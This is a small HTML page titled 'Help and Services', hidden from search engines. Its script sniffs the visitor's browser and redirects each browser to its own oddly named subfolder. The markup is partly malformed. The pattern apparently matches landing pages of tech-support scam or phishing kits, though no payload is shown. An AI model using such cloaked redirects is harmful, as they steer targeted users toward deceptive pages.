<html xmlns="http:/www.w3.org/1999/xhtml">
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><meta name="robots" content="noindex,nofollow">
	<title>Help and Services </title>

	<script type="text/javascript">
	var isChromium = window.chrome,
    vendorName = window.navigator.vendor,
    isOpera = window.navigator.userAgent.indexOf("OPR") > -1,
    isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
	if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
   	// is Google chrome
	window.location.href = "./Chfdfdfdfdfd0071/index.html";
	}
	if(navigator.userAgent.indexOf("Firefox") != -1 )
    {
         window.location.href = "./FFfdfdfdfdfd0071/index.html";
    }
	if(window.navigator.userAgent.indexOf("Edge") != -1 )
    {
         window.location.href = "./EDfdfdfdfdfd0071/index.html";
    }
	if(window.navigator.userAgent.indexOf("Mac") != -1 )
    {
         window.location.href = "./MAfdfdfdfdfd0071/index.html";
    }
	if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 10
    {
      window.location.href = "./EDfdfdfdfdfd0071/index.html";
    }
	$SAFARI_URL = "apple";
</script>


</body>


</html>
